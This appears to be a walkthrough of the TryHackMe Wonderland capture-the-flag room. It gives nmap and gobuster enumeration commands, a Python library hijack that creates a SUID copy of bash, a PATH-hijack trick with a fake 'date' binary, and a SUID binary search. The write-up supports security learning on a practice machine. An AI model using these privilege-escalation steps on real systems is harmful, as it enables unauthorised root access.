
# 🧩 TryHackMe: Wonderland Walkthrough

Inspired by: [CodeQuoi Wonderland Walkthrough](https://www.codequoi.com/en/ctf-walkthrough-wonderland-tryhackme/)

---

## 🚀 Getting Started

1. **Access the Challenge**:
   - [TryHackMe Wonderland Room](https://tryhackme.com/room/wonderland)

2. **Connect to TryHackMe VPN**:
   ```bash
   sudo openvpn /path/to/your/vpn-config.ovpn
   ```

3. **Ping Target**:
   ```bash
   ping <target-ip>
   ```

---

## 🔍 Enumeration

### 1. Nmap Scan
```bash
nmap -sV -sC -Pn <target-ip>
```

### 2. Web Enumeration
- Visit `http://<target-ip>`
- Use Gobuster:
```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
- Follow `/r/a/b/b/i/t` path and view source for credentials.

---

## 🔐 SSH Access

Login using found credentials:
```bash
ssh [email protected]<target-ip>
```

---

## 🧑‍💻 Privilege Escalation: Alice → Rabbit

### 1. Sudo Permissions
```bash
sudo -l
```

### 2. Python Library Hijack
Create a fake `random.py`:
```python
import os
os.system('cp /bin/bash /tmp/bash')
os.system('chmod +s /tmp/bash')
```

Execute script:
```bash
sudo -u rabbit python3 /home/alice/walrus_and_the_carpenter.py
/tmp/bash -p
```

---

## 🎩 Privilege Escalation: Rabbit → Hatter

### 1. Inspect teaParty Binary
```bash
ls -l /home/rabbit/teaParty
```

### 2. PATH Exploit
If binary runs commands like `date`, create a fake `date` in PATH:
```bash
echo "/bin/bash" > date
chmod +x date
export PATH=.:$PATH
./teaParty
```

---

## 👑 Root Access

Check for readable `root.txt` or SUID root binaries:
```bash
find / -perm -u=s -type f 2>/dev/null
```

---

## 🏁 Flags

- **User Flag**: typically in `/home/<user>/user.txt`
- **Root Flag**: typically in `/root/root.txt`

---

## ✅ Completion

Make sure to submit both flags in TryHackMe to complete the room!
